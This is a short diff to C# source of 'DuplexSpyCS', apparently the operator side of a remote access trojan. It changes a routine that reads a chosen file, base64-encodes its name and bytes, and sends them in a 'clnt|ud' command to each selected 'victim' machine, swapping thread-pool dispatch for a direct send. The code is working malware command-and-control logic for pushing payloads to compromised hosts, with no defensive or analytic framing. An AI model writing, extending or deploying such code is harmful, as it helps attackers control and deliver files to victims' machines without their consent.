@@ -90,17 +90,21 @@ namespace DuplexSpyCS
             }
 
             byte[] abBuffer = File.ReadAllBytes(szFileName);
-
-            int nThd = (int)numericUpDown1.Value;
             int nCode = checkBox1.Checked ? 1 : 0;
-            ThreadPool.SetMinThreads(1, 1);
-            ThreadPool.SetMaxThreads(nThd, nThd);
+
+            string szB64Name = clsCrypto.b64E2Str(Path.GetFileName(szFileName));
+            string szB64Payload = Convert.ToBase64String(abBuffer);
+
             foreach (ListViewItem item in listView1.CheckedItems)
             {
                 clsVictim v = (clsVictim)item.Tag;
-                ThreadPool.QueueUserWorkItem(x =>
+                v.fnSendCommand(new string[]
                 {
-                    v.SendCommand($"clnt|ud|{nCode}|{clsCrypto.b64E2Str(Path.GetFileName(szFileName))}|" + Convert.ToBase64String(abBuffer));
+                    "clnt",
+                    "ud",
+                    nCode.ToString(),
+                    szB64Name,
+                    szB64Payload,
                 });
             }
         }
